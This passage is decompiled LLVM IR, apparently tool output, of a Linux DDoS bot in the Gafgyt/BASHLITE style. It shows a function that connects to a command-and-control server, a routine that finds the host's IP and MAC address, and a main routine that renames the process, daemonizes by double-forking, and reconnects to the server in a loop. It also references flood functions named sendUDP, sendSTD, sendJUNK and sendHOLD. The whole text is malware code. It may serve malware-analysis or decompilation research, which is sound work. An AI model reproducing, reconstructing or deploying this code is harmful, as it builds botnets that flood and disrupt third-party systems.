  uselistorder i1 %v0_8051125, { 1, 0 }
  uselistorder i32 %v3_8051093, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %storemerge3, { 1, 0, 2 }
  uselistorder i32 %v2_8050fa0, { 1, 0 }
  uselistorder i32 %v2_8050f92, { 1, 0 }
  uselistorder i32 %v2_8050f7f, { 1, 0 }
  uselistorder i32 %v2_8050f6c, { 1, 0 }
  uselistorder i32 %v2_8050f5c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050f10, { 1, 0 }
  uselistorder i32 %v2_8050f0b, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_8050ef2, { 1, 0, 2 }
  uselistorder i32 %v2_8050ed9, { 1, 0, 2 }
  uselistorder i32 %v2_8050ec0, { 1, 0, 2 }
  uselistorder i1 %v0_8050e94, { 1, 0 }
  uselistorder i32 %v3_8050e1e, { 1, 0 }
  uselistorder i32 %v2_8050daa, { 1, 0 }
  uselistorder i32 %v2_8050d97, { 1, 0 }
  uselistorder i32 %v2_8050d87, { 2, 1, 0, 3 }
  uselistorder i1 %v0_8050d2f, { 1, 0 }
  uselistorder i32 %v3_8050c83, { 1, 0 }
  uselistorder i32 %v2_8050bc9, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_8050bb6, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_8050ba6, { 2, 3, 4, 1, 0, 5 }
  uselistorder i1 %v0_8050b4e, { 1, 0 }
  uselistorder i32 %v3_8050ad8, { 1, 0 }
  uselistorder i32 %v2_8050a57, { 1, 0 }
  uselistorder i32 %v2_8050a44, { 1, 0 }
  uselistorder i32 %v2_8050a34, { 2, 1, 0, 3 }
  uselistorder i1 %v0_80509dc, { 1, 0 }
  uselistorder i32 %v2_8050964, { 1, 0 }
  uselistorder i32 %v2_80508b4, { 1, 0 }
  uselistorder i32* %v1_8050838, { 2, 0, 1, 3 }
  uselistorder i1 %v5_8050835, { 2, 0, 1, 3 }
  uselistorder i1 %v0_8050811, { 1, 0 }
  uselistorder i32 %v7_805080f, { 1, 0 }
  uselistorder i32 %v3_8050780, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0, 2 }
  uselistorder i32 %v2_80506b9, { 1, 0 }
  uselistorder i32 %v2_80506a6, { 1, 0 }
  uselistorder i32 %v2_8050693, { 1, 0 }
  uselistorder i32 %v2_805067d, { 1, 0 }
  uselistorder i32 %v2_805066a, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805063c, { 1, 0 }
  uselistorder i32 %v2_8050637, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v1_8050621, { 1, 0 }
  uselistorder i32 %v2_805061c, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_8050603, { 1, 0, 2 }
  uselistorder i32 %v2_80505ea, { 1, 0, 2 }
  uselistorder i32 %v2_80505d1, { 1, 0, 2 }
  uselistorder i32 %v2_80505b8, { 1, 0, 2 }
  uselistorder i1 %v0_805058c, { 1, 0 }
  uselistorder i32 %v3_8050507, { 1, 0 }
  uselistorder i32 %v2_805046d, { 1, 0 }
  uselistorder i32 %v2_8050457, { 1, 0 }
  uselistorder i32 %v2_8050444, { 2, 1, 0, 3 }
  uselistorder i1 %v0_80503ec, { 1, 0 }
  uselistorder i32 %v3_8050367, { 1, 0 }
  uselistorder i32 %v2_80502de, { 1, 0 }
  uselistorder i32 %v2_80502c8, { 1, 0 }
  uselistorder i32 %v2_80502b5, { 2, 1, 0, 3 }
  uselistorder i1 %v0_805025d, { 1, 0 }
  uselistorder i1 %v0_80501f0, { 1, 0 }
  uselistorder i1 %v0_805019c, { 1, 0 }
  uselistorder i1 %v0_8050106, { 1, 0 }
  uselistorder i1 %v0_805007b, { 1, 0 }
  uselistorder i1 %v0_805000d, { 1, 0 }
  uselistorder i1 %v0_804ff97, { 1, 0 }
  uselistorder i1 %v0_804ff1c, { 1, 0 }
  uselistorder i1 %v0_804fea9, { 1, 0 }
  uselistorder i1 %v0_804fe48, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp217, { 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 5, 4, 1, 2, 3, 6, 7, 8, 10, 9, 11, 12, 14, 13, 15, 16, 18, 17, 19, 20, 21 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 9, 3, 8, 4, 5, 6, 7, 10, 173, 11, 13, 12, 174, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 177, 38, 40, 39, 178, 41, 42, 43, 44, 45, 46, 47, 48, 49, 179, 50, 52, 51, 180, 53, 54, 55, 56, 57, 58, 59, 60, 61, 73, 62, 64, 63, 0, 65, 66, 67, 68, 69, 70, 71, 72, 74, 175, 75, 76, 77, 78, 79, 85, 80, 81, 82, 83, 84, 176, 86, 87, 88, 89, 90, 181, 91, 93, 92, 182, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 183, 118, 120, 119, 184, 121, 122, 123, 124, 125, 126, 127, 128, 129, 185, 130, 132, 131, 186, 133, 134, 135, 136, 137, 138, 139, 140, 141, 146, 142, 143, 144, 145, 147, 159, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 160, 162, 161, 163, 165, 164, 166, 167, 168, 169, 170, 171, 172 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32* inttoptr (i32 -25 to i32*), { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @sendJUNK, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805b911.422 to i32), { 7, 8, 6, 9, 5, 10, 4, 11, 3, 12, 2, 13, 1, 14, 0, 15, 16, 17 }
  uselistorder i32* inttoptr (i32 -13 to i32*), { 2, 3, 4, 5, 0, 1, 6, 7, 8 }
  uselistorder [3 x i8]* @global_var_805b9a0.441, { 1, 0 }
  uselistorder i32* %arg2, { 8, 9, 7, 10, 11, 6, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 1, 2, 3, 4, 5, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 %arg1, { 0, 24, 12, 11, 23, 10, 22, 9, 21, 8, 20, 7, 19, 1, 18, 6, 17, 5, 16, 4, 15, 2, 14, 3, 13 }
  uselistorder label %dec_label_pc_8051255, { 47, 15, 16, 0, 17, 18, 19, 20, 21, 7, 22, 1, 23, 8, 24, 2, 25, 9, 26, 3, 27, 10, 28, 11, 29, 4, 30, 31, 32, 33, 34, 35, 12, 36, 5, 37, 13, 38, 6, 39, 14, 40, 43, 41, 42, 44, 45, 46 }
  uselistorder label %dec_label_pc_80511a5, { 1, 0 }
  uselistorder label %dec_label_pc_80511a2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805103a, { 1, 0 }
  uselistorder label %dec_label_pc_8050ffe, { 1, 0 }
  uselistorder label %dec_label_pc_8050fcd, { 1, 0 }
  uselistorder label %dec_label_pc_8050f37, { 1, 0 }
  uselistorder label %dec_label_pc_8050de1, { 1, 0 }
  uselistorder label %dec_label_pc_8050c07, { 1, 0 }
  uselistorder label %dec_label_pc_8050a8e, { 1, 0 }
  uselistorder label %dec_label_pc_8050872, { 1, 0 }
  uselistorder label %dec_label_pc_805072b, { 1, 0 }
  uselistorder label %dec_label_pc_80506e9, { 1, 0 }
  uselistorder label %dec_label_pc_80504b4, { 1, 0 }
  uselistorder label %dec_label_pc_8050321, { 1, 0 }
  uselistorder label %dec_label_pc_80500cf, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051260 = load i32, i32* @ebp, align 4
  store i32 %v0_8051260, i32* %stack_var_-4, align 4
  %v4_8051260 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8051260, i32* @ebp, align 4
  %v2_8051269 = ptrtoint i32* %stack_var_-4104 to i32
  %tmp11 = bitcast i32* %stack_var_-4104 to i8*
  %v5_8051285 = call i32 @__GI_memset(i8* %tmp11, i32 0, i32 4096)
  %v0_805128a = load i8*, i8** @global_var_805e480.20, align 4
  %v2_805128f = icmp eq i8* %v0_805128a, null
  br i1 %v2_805128f, label %dec_label_pc_80512aa, label %dec_label_pc_8051293

dec_label_pc_8051293:                             ; preds = %entry
  %v1_805128a = ptrtoint i8* %v0_805128a to i32
  %v2_805129b = call i32 @__libc_close(i32 %v1_805128a)
  store i8* null, i8** @global_var_805e480.20, align 128
  br label %dec_label_pc_80512aa

dec_label_pc_80512aa:                             ; preds = %entry, %dec_label_pc_8051293
  %v0_80512aa = load i32, i32* @global_var_805e0f0.454, align 16
  %v1_80512af = icmp eq i32 %v0_80512aa, 0
  %v1_80512b1 = icmp eq i1 %v1_80512af, false
  br i1 %v1_80512b1, label %dec_label_pc_80512bf, label %dec_label_pc_80512ca

dec_label_pc_80512bf:                             ; preds = %dec_label_pc_80512aa
  %v1_80512c4 = add i32 %v0_80512aa, 1
  br label %dec_label_pc_80512ca

dec_label_pc_80512ca:                             ; preds = %dec_label_pc_80512aa, %dec_label_pc_80512bf
  %storemerge = phi i32 [ %v1_80512c4, %dec_label_pc_80512bf ], [ 0, %dec_label_pc_80512aa ]
  store i32 %storemerge, i32* @global_var_805e0f0.454, align 16
  %v1_80512cf = mul i32 %storemerge, 4
  %v2_80512cf = add i32 %v1_80512cf, ptrtoint ([16 x i8]** @global_var_805e040.456 to i32)
  %v3_80512cf = inttoptr i32 %v2_80512cf to i32*
  %v4_80512cf = load i32, i32* %v3_80512cf, align 4
  store i32 %v4_80512cf, i32* @eax, align 4
  %v4_80512e3 = call i32 @strcpy(i8* %tmp11, i32 %v4_80512cf)
  %v0_80512e8 = load i32, i32* @global_var_805e044.457, align 4
  %v4_8051301 = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v1_8051306 = icmp eq i32 %v4_8051301, 0
  br i1 %v1_8051306, label %dec_label_pc_8051345, label %dec_label_pc_805130a

dec_label_pc_805130a:                             ; preds = %dec_label_pc_80512ca
  %v4_805131b = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v1_8051320 = add i32 %v4_805131b, 1
  %v2_8051324 = call i32 @atol(i32 %v1_8051320)
  %v4_805133d = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v5_805133d = inttoptr i32 %v4_805133d to i8*
  store i8 0, i8* %v5_805133d, align 1
  br label %dec_label_pc_8051345

dec_label_pc_8051345:                             ; preds = %dec_label_pc_80512ca, %dec_label_pc_805130a
  %stack_var_-8.0 = phi i32 [ %v0_80512e8, %dec_label_pc_80512ca ], [ %v2_8051324, %dec_label_pc_805130a ]
  %v4_805135c = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_8051361 = inttoptr i32 %v4_805135c to i8*
  store i8* %v1_8051361, i8** @global_var_805e480.20, align 128
  %v5_8051388 = call i32 @connectTimeout(i32 %v4_805135c, i32 %v2_8051269, i32 %stack_var_-8.0, i32 30)
  %v1_805138d = icmp eq i32 %v5_8051388, 0
  %. = zext i1 %v1_805138d to i32
  %v2_80513ad = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80513ad, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8* %v0_805128a, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 0, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051345, { 1, 0 }
  uselistorder label %dec_label_pc_80512ca, { 1, 0 }
  uselistorder label %dec_label_pc_80512aa, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80513af = load i32, i32* @ebp, align 4
  store i32 %v0_80513af, i32* %stack_var_-4, align 4
  %v5_80513cf = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_80513d7 = icmp eq i32 %v5_80513cf, -1
  %v1_80513db = icmp eq i1 %v13_80513d7, false
  br i1 %v1_80513db, label %dec_label_pc_80513ec, label %dec_label_pc_80515ca

dec_label_pc_80513ec:                             ; preds = %entry
  %v2_80513ec = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_8051417 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_805b9f8.458 to i32))
  %v3_8051426 = call i32 @htons(i16 53)
  %v5_8051447 = call i32 @__libc_connect(i32 %v5_80513cf, i32 %v2_80513ec, i32 16)
  %v13_805144f = icmp eq i32 %v5_8051447, -1
  %v1_8051453 = icmp eq i1 %v13_805144f, false
  br i1 %v1_8051453, label %dec_label_pc_8051464, label %dec_label_pc_80515ca

dec_label_pc_8051464:                             ; preds = %dec_label_pc_80513ec
  store i32 16, i32* %stack_var_-60, align 4
  %v2_805146b = ptrtoint i32* %stack_var_-56 to i32
  %v2_805146e = ptrtoint i32* %stack_var_-60 to i32
  %v5_805147f = call i32 @__GI_getsockname(i32 %v5_80513cf, i32 %v2_805146b, i32 %v2_805146e)
  %v13_8051487 = icmp eq i32 %v5_805147f, -1
  %v1_805148b = icmp eq i1 %v13_8051487, false
  br i1 %v1_805148b, label %dec_label_pc_805149c, label %dec_label_pc_80515ca

dec_label_pc_805149c:                             ; preds = %dec_label_pc_8051464
  %v5_80514b3 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805ba00.459, i32 0, i32 0), i32 0)
  %v2_8051518 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_805153034 = call i32 @fdgets(i32 %v2_8051518, i32 4096, i32 %v5_80514b3)
  %v1_805153535 = icmp eq i32 %v5_805153034, 0
  %v1_805153737 = icmp eq i1 %v1_805153535, false
  br i1 %v1_805153737, label %dec_label_pc_80514bd, label %dec_label_pc_8051539

dec_label_pc_80514bd:                             ; preds = %dec_label_pc_805149c, %dec_label_pc_80514f7
  %v5_80514ce = call i32 @strstr(i32 %v2_8051518, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805ba10.460, i32 0, i32 0))
  %v1_80514d3 = icmp eq i32 %v5_80514ce, 0
  br i1 %v1_80514d3, label %dec_label_pc_80514f7, label %dec_label_pc_80514e5

dec_label_pc_80514e2:                             ; preds = %dec_label_pc_80514e5
  %v4_80514e5 = ptrtoint i8* %storemerge5 to i32
  %v5_80514e2 = add i32 %v4_80514e5, 1
  %v22_80514e2 = inttoptr i32 %v5_80514e2 to i8*
  br label %dec_label_pc_80514e5

dec_label_pc_80514e5:                             ; preds = %dec_label_pc_80514bd, %dec_label_pc_80514e2
  %storemerge5 = phi i8* [ %v22_80514e2, %dec_label_pc_80514e2 ], [ %stack_var_-4156, %dec_label_pc_80514bd ]
  %v2_80514e8 = load i8, i8* %storemerge5, align 1
  %v10_80514eb = icmp eq i8 %v2_80514e8, 9
  %v1_80514ed = icmp eq i1 %v10_80514eb, false
  br i1 %v1_80514ed, label %dec_label_pc_80514e2, label %dec_label_pc_80514ef

dec_label_pc_80514ef:                             ; preds = %dec_label_pc_80514e5
  store i8 0, i8* %storemerge5, align 1
  br label %dec_label_pc_8051539

dec_label_pc_80514f7:                             ; preds = %dec_label_pc_80514bd
  %v6_8051513 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_8051530 = call i32 @fdgets(i32 %v2_8051518, i32 4096, i32 %v5_80514b3)
  %v1_8051535 = icmp eq i32 %v5_8051530, 0
  %v1_8051537 = icmp eq i1 %v1_8051535, false
  br i1 %v1_8051537, label %dec_label_pc_80514bd, label %dec_label_pc_8051539

dec_label_pc_8051539:                             ; preds = %dec_label_pc_805149c, %dec_label_pc_80514f7, %dec_label_pc_80514ef
  %v2_805153f = call i32 @__libc_close(i32 %v5_80514b3)
  %v3_8051544 = load i8, i8* %stack_var_-4156, align 1
  %v4_805154b = icmp eq i8 %v3_8051544, 0
  br i1 %v4_805154b, label %dec_label_pc_80515b1, label %dec_label_pc_805154f

dec_label_pc_805154f:                             ; preds = %dec_label_pc_8051539
  %v2_8051559 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_8051559, i32* @eax, align 4
  %tmp32 = bitcast i32* %stack_var_-4188 to i8*
  %v5_8051562 = call i32 @strcpy(i8* %tmp32, i32 %v2_8051518)
  %v5_805157f = call i32 @ioctl(i32 %v5_80513cf, i32 35111, i32 %v2_8051559)
  %v2_8051596 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_805158d

dec_label_pc_805158d:                             ; preds = %dec_label_pc_805154f, %dec_label_pc_805158d
  %storemerge33 = phi i32 [ 0, %dec_label_pc_805154f ], [ %v4_80515a8, %dec_label_pc_805158d ]
  %v2_805159c = add i32 %storemerge33, %v2_8051596
  %v1_805159f = inttoptr i32 %v2_805159c to i8*
  %v2_805159f = load i8, i8* %v1_805159f, align 1
  %v3_80515a2 = add i32 %storemerge33, ptrtoint (i8** @global_var_805e490.461 to i32)
  %v4_80515a2 = inttoptr i32 %v3_80515a2 to i8*
  store i8 %v2_805159f, i8* %v4_80515a2, align 1
  %v4_80515a8 = add nuw nsw i32 %storemerge33, 1
  %exitcond = icmp eq i32 %v4_80515a8, 6
  br i1 %exitcond, label %dec_label_pc_80515b1, label %dec_label_pc_805158d

dec_label_pc_80515b1:                             ; preds = %dec_label_pc_805158d, %dec_label_pc_8051539
  %v2_80515b7 = call i32 @__libc_close(i32 %v5_80513cf)
  br label %dec_label_pc_80515ca

dec_label_pc_80515ca:                             ; preds = %entry, %dec_label_pc_80513ec, %dec_label_pc_8051464, %dec_label_pc_80515b1
  %stack_var_-4204.0 = phi i32 [ %tmp, %dec_label_pc_80515b1 ], [ 0, %dec_label_pc_8051464 ], [ 0, %dec_label_pc_80513ec ], [ 0, %entry ]
  %v2_80515d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80515d0, i32* @ebp, align 4
  ret i32 %stack_var_-4204.0

; uselistorder directives
  uselistorder i8* %storemerge5, { 0, 2, 1 }
  uselistorder i32 %v2_8051518, { 1, 3, 2, 0 }
  uselistorder i32 %v5_80514b3, { 1, 2, 0 }
  uselistorder i32 %v5_80513cf, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 3, 1, 0, 2 }
  uselistorder i32 (i16)* @htons, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12, 14, 13 }
  uselistorder label %dec_label_pc_80515ca, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805158d, { 1, 0 }
  uselistorder label %dec_label_pc_8051539, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80514e5, { 1, 0 }
  uselistorder label %dec_label_pc_80514bd, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v0_80515d2 = load i32, i32* @ebp, align 4
  %v3_80515e7 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_805ba1b.462 to i32), i32 0)
  %v10_80515ec = icmp eq i32 %v3_80515e7, -1
  %v4_8051601 = select i1 %v10_80515ec, i32 ptrtoint ([7 x i8]* @global_var_805ba32.464 to i32), i32 ptrtoint ([7 x i8]* @global_var_805ba2b.463 to i32)
  store i32 %v0_80515d2, i32* @ebp, align 4
  ret i32 %v4_8051601
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-5376 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8051606 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8051606, i32* %stack_var_-24, align 4
  %v5_8051617 = icmp ult i32* %stack_var_-24, inttoptr (i32 5352 to i32*)
  store i1 %v5_8051617, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805ba1b.462, i32 0, i32 0), i8** %stack_var_-5376, align 4
  %v4_8051639 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_805ba1b.462 to i32), i32 0)
  %v5_805163e = icmp ne i32 %v4_8051639, -1
  store i1 %v5_805163e, i1* %cf.global-to-local, align 1
  %v10_805163e = icmp eq i32 %v4_8051639, -1
  %. = select i1 %v10_805163e, i32 ptrtoint ([19 x i8]* @global_var_805ba3f.467 to i32), i32 ptrtoint ([5 x i8]* @global_var_805ba3a.466 to i32)
  %v0_8051653 = call i32 @geteuid()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051658 = icmp eq i32 %v0_8051653, 0
  %v1_805165a = icmp eq i1 %v1_8051658, false
  br i1 %v1_805165a, label %dec_label_pc_8051666, label %dec_label_pc_805165c

dec_label_pc_805165c:                             ; preds = %entry
  store i32 0, i32* @global_var_805e0ec.468, align 4
  br label %dec_label_pc_8051666

dec_label_pc_8051666:                             ; preds = %entry, %dec_label_pc_805165c
  %v0_8051666 = call i32 @getBuild()
  %v0_805166e = load i32, i32* @global_var_8064708.231, align 8
  %v4_8051673 = inttoptr i32 %v0_805166e to i8*
  store i8* %v4_8051673, i8** %stack_var_-5376, align 4
  %v2_8051676 = call i32 @__GI_inet_ntoa(i32 %v0_805166e)
  store i32 %v2_8051676, i32* @ebx, align 4
  %v0_805167d = call i32 @getBuild()
  %v0_8051682 = load i32, i32* @ebx, align 4
  %v5_8051682 = inttoptr i32 %v0_8051682 to i8*
  %v5_8051686 = inttoptr i32 %v0_805167d to i8*
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805ba52.469, i32 0, i32 0), i8** %stack_var_-5376, align 4
  %v9_8051691 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805ba52.469, i32 0, i32 0), i8* %v5_8051686, i8* %v5_8051682)
  %v1_805169c = add i32 %v2_8051606, 4
  %v2_805169c = inttoptr i32 %v1_805169c to i32*
  %v3_805169c = load i32, i32* %v2_805169c, align 4
  %v1_805169f = inttoptr i32 %v3_805169c to i32*
  %v2_805169f = load i32, i32* %v1_805169f, align 4
  store i1 false, i1* @df, align 1
  %v4_80516af = inttoptr i32 %v2_805169f to i8*
  store i32 %v2_805169f, i32* @edi, align 4
  %v3_80516b5 = call i32 @_strlen(i8* %v4_80516af)
  %v3_80516c4 = load i32, i32* %v2_805169c, align 4
  %v1_80516c7 = inttoptr i32 %v3_80516c4 to i32*
  %v2_80516c7 = load i32, i32* %v1_80516c7, align 4
  %v4_80516d5 = inttoptr i32 %v2_80516c7 to i8*
  store i8* %v4_80516d5, i8** %stack_var_-5376, align 4
  %v7_80516d8 = call i32 @strncpy(i8* %v4_80516d5, i32 ptrtoint (i32* @global_var_805ba39.465 to i32), i32 %v3_80516b5)
  store i32 %v2_8051606, i32* @esi, align 4
  %v3_80516e3 = load i32, i32* %v2_805169c, align 4
  %v1_80516e6 = inttoptr i32 %v3_80516e3 to i32*
  %v2_80516e6 = load i32, i32* %v1_80516e6, align 4
  %v4_80516f1 = inttoptr i32 %v2_80516e6 to i8*
  store i8* %v4_80516f1, i8** %stack_var_-5376, align 4
  %v4_80516f4 = call i32 @sprintf(i32 %v2_80516e6, i32 %.)
  store i8* inttoptr (i32 15 to i8*), i8** %stack_var_-5376, align 4
  %v9_805171f = call i32 @prctl(i32 15, i32 %., i32 0, i32 0, i32 0)
  store i8* null, i8** %stack_var_-5376, align 4
  %v3_805172b = call i32 @__GI_time(i32* null)
  store i32 %v3_805172b, i32* @ebx, align 4
  %v0_8051732 = call i32 @__libc_getpid()
  %v1_8051737 = load i32, i32* @ebx, align 4
  %v2_8051737 = xor i32 %v1_8051737, %v0_8051732
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_8051737, i32* @eax, align 4
  %v4_8051739 = inttoptr i32 %v2_8051737 to i8*
  store i8* %v4_8051739, i8** %stack_var_-5376, align 4
  %v2_805173c = call i32 @srand(i32 %v2_8051737)
  store i8* null, i8** %stack_var_-5376, align 4
  %v3_8051748 = call i32 @__GI_time(i32* null)
  store i32 %v3_8051748, i32* @ebx, align 4
  %v0_805174f = call i32 @__libc_getpid()
  %v1_8051754 = load i32, i32* @ebx, align 4
  %v2_8051754 = xor i32 %v1_8051754, %v0_805174f
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8051756 = inttoptr i32 %v2_8051754 to i8*
  store i8* %v4_8051756, i8** %stack_var_-5376, align 4
  %v2_8051759 = call i32 @init_rand(i32 %v2_8051754)
  %v0_805175e = call i32 @getOurIP()
  %v0_8051763 = load i8*, i8** %stack_var_-5376, align 4
  %v1_8051763 = ptrtoint i8* %v0_8051763 to i32
  %v2_8051763 = call i32 @__libc_fork(i32 %v1_8051763)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805176b = icmp eq i32 %v2_8051763, 0
  br i1 %v4_805176b, label %dec_label_pc_805179d, label %dec_label_pc_8051797.thread

dec_label_pc_8051797.thread:                      ; preds = %dec_label_pc_8051666
  %v2_8051779 = ptrtoint i32* %stack_var_-92 to i32
  %v4_8051783 = inttoptr i32 %v2_8051763 to i8*
  store i8* %v4_8051783, i8** %stack_var_-5376, align 4
  %v6_8051786 = call i32 @__libc_waitpid(i32 %v2_8051763, i32 %v2_8051779, i32 0)
  store i32 %v6_8051786, i32* @eax, align 4
  store i8* null, i8** %stack_var_-5376, align 4
  %v2_8051792 = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80517b7

dec_label_pc_805179d:                             ; preds = %dec_label_pc_8051666
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_805179d = load i8*, i8** %stack_var_-5376, align 4
  %v1_805179d = ptrtoint i8* %v0_805179d to i32
  %v2_805179d = call i32 @__libc_fork(i32 %v1_805179d)
  store i32 %v2_805179d, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80517a5 = icmp eq i32 %v2_805179d, 0
  br i1 %v4_80517a5, label %dec_label_pc_80517b7, label %dec_label_pc_80517ab

dec_label_pc_80517ab:                             ; preds = %dec_label_pc_805179d
  store i8* null, i8** %stack_var_-5376, align 4
  %v2_80517b2 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80517b7

dec_label_pc_80517b7:                             ; preds = %dec_label_pc_8051797.thread, %dec_label_pc_805179d, %dec_label_pc_80517ab
  %v0_80517b7 = call i32 @__GI_setsid()
  store i8* bitcast (i32* @global_var_805ba5f.470 to i8*), i8** %stack_var_-5376, align 4
  %v2_80517c3 = call i32 @chdir(i32 ptrtoint (i32* @global_var_805ba5f.470 to i32))
  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-5376, align 4
  %v4_80517d7 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_8051e4c = ptrtoint i32* %stack_var_-5252 to i32
  %tmp98 = bitcast i32* %stack_var_-5252 to i8*
  %v1_8051aee = or i32 %v2_8051e4c, 1
  %v5_8051b23 = inttoptr i32 %v1_8051aee to i8*
  %tmp99 = bitcast i8** %stack_var_-36 to i32*
  %v2_8051c71 = ptrtoint i32* %stack_var_-1156 to i32
  %tmp100 = bitcast i32* %stack_var_-1156 to i8*
  br label %dec_label_pc_80517de

dec_label_pc_80517de:                             ; preds = %dec_label_pc_80517e7, %dec_label_pc_8051e4c, %dec_label_pc_80517b7
  %v0_80517de = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80517e3 = icmp eq i32 %v0_80517de, 0
  br i1 %v1_80517e3, label %dec_label_pc_80517f5, label %dec_label_pc_80517e7

dec_label_pc_80517e7:                             ; preds = %dec_label_pc_80517de
  store i8* inttoptr (i32 5 to i8*), i8** %stack_var_-5376, align 4
  %v2_80517ee = call i32 @sleep(i32 5)
  br label %dec_label_pc_80517de

dec_label_pc_80517f5:                             ; preds = %dec_label_pc_80517de
  %v0_80517f5 = call i32 @getBuild()
  store i32 %v0_80517f5, i32* @ebx, align 4
  %v0_80517fc = load i32, i32* @global_var_8064708.231, align 8
  %v4_8051801 = inttoptr i32 %v0_80517fc to i8*
  store i8* %v4_8051801, i8** %stack_var_-5376, align 4
